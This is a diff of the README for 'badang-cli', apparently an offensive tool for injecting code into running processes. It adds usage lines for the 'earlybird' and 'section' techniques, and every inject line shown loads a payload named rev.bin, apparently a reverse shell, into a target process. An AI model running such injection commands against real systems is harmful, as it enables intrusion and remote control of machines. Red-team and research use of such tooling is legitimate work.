@@ -25,7 +25,11 @@ badang-cli analyze --pid 1234 -x -c       # live scan
 badang-cli inject --pid 1234 --technique createremote --payload rev.bin -x -c
 badang-cli inject --pid 1234 --technique apc --payload rev.bin -x -c
 badang-cli inject --pid 1234 --technique hijack --payload rev.bin -x -c
+badang-cli inject --technique earlybird --payload rev.bin -x -c           # no PID needed
+badang-cli inject --pid 1234 --technique section --payload rev.bin -x -c
 ```
+
+Techniques: `createremote`, `apc`, `hijack`, `earlybird`, `section`
 
 ### Syscall
 ```bash
